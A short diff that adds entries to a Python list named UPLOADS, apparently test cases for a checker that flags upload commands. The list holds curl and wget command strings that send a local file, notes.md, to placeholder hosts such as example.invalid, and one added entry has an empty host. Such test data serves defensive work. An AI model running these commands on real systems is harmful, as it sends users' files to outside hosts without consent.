@@ -62,6 +62,7 @@ UPLOADS = [
     "cat notes.md | curl --data-binary @- https://example.invalid/up",
     "curl -F file=@notes.md https://example.invalid/up && echo done",
     "curl -F file=@notes.md http://127.0.0.1:8080/up https://example.invalid/up",
+    "curl -d @notes.md https:///up", "wget --method=POST https://example.invalid/x", "wget --method PATCH https://h.invalid/x",
 ]
 
 
